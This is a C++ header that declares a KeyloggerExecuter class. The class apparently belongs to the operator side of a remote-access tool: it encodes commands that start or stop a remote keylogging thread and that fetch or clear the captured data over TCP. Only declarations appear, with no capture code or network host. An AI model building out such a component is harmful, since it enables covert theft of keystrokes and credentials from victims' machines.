#pragma once

#include "command/interface/ICommandExecuter.h"
#include "networking/interfaces/ITCPClient.h"


namespace command
{
/**
  * Objects of type KeyloggerExecuter
  *
  * Can decide
  */
class KeyloggerExecuter
    : public ICommandExecuter
{
public:
    KeyloggerExecuter(tag_t tag, std::string name)
        : ICommandExecuter(tag, std::move(name))
    {}
    virtual ~KeyloggerExecuter() = default;

    std::string ToByteArray(const std::vector<std::string>& command_parts);
    bool ProcessResponse(networking::ITCPClient& connection);

protected:

    /**
      * This enum is used to command remote thread's state.
      */
    enum ThreadState
    {
        Start,
        Stop,
        Keep
    };

    /**
      * This struct is used to explicitly address significant addresses
      * inside the received bytes array.
      */
#pragma pack(1)
    typedef struct
    {
        tag_t tag;
        ThreadState thread_state;
        bool get_data;
        bool clear_data;
    } s_Translation;
#pragma pack()

    s_Translation m_lastCommand = { .tag = m_tag };

};
}
